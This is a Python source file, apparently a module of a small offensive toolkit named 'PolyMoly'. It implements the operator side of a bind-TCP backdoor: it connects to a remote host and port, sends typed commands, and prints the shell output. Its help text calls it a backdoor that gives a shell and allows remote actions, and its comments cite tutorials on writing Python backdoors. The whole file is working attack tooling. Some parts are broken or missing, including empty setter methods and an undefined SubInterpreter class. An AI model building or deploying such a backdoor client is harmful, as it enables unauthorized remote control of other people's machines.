import sys
import glob
import socket
import threading
from os import system
from netaddr import ip
from termcolor import colored
from prettytable import PrettyTable


class PolymolyBindTcp():
    """Simple PolyMoly Bind TCP handler"""
    
    def __init__(self):
        self.rhost = ''
        self.rport = 1234

    def get_names(self):
        return dir(self.__class__)

    def launch(self):
       
        launchModule(self.rhost, self.rport)


    def set_rhost(self):
        """Define IP address of remote host to bind"""

    def set_rport(self):
        """Define port of remote host to bind"""

    def showOptions(self):
        """Display options about PolyMolyBindTcp"""

        print("""The polymoly_bind_tcp backdoor is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in self.__dict__.keys():
            optionName = option
            optionValue = self.__dict__[option]
            optionDoc = getattr(self, f"set_{option}").__doc__

            table.add_row([optionName, optionValue, optionDoc])

        print(table)



        

def startModule(moduleName):

    
    Polymoly = PolymolyBindTcp()
    subTerminal = SubInterpreter()
    
    subTerminal.prompt = f"({colored(moduleName, 'yellow')}) > "
    subTerminal.init_focus(Polymoly)
    subTerminal.cmdloop()


def sendCommand(channel):

    bufferSize = 1024

    try:

        while True:

            command = input(f"shell > ").encode()
            # If user want to clean console
            if command == 'clear':
                system('clear')
            else:
                channel.sendall(command)
                while True:
                    rawResponse = channel.recv(bufferSize)
                    if len(rawResponse) < bufferSize:
                        break

                shellReponse = rawResponse.decode()
                print(shellReponse)

    except ConnectionResetError:
        print(f"\n[-] Channel reset by peer")
        return

    except BrokenPipeError:
        print(f"\n[-] Channel reset by peer (broken pipe)")
        return

    except KeyboardInterrupt:
        print("Dans sendCommand")
        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')

        if choice.lower() == 'y':
            print("\nquitting PolyMole")
            channel.close()
            return
        elif choice.lower() == 'n':
            pass




def launchModule(rhost, rport):


    host = rhost
    port = int(rport)


    try:
    
        print(f"[+] Trying to connect to {host}:{port}")

        channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        channel.connect((host, port))
        print(f"[+] Connection established to {host}:{port}")


        t = threading.Thread(target=sendCommand, daemon=True, args=((channel,)))
        t.start()

        t.join()
        channel.close()
        

    except KeyboardInterrupt:
        print("Dans launchModule")
        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')

        if choice.lower() == 'y':
            print("\nquitting PolyMole")
            channel.close()
            return
        elif choice.lower() == 'n':
            pass

    except ConnectionError:
        print(f"[!] Can't established connection to {host}")
        return

    except ConnectionRefusedError as e:
        print(e)
        return

    # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
    # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
    # https://dev.to/tman540/simple-remote-backdoor-with-python-33a0
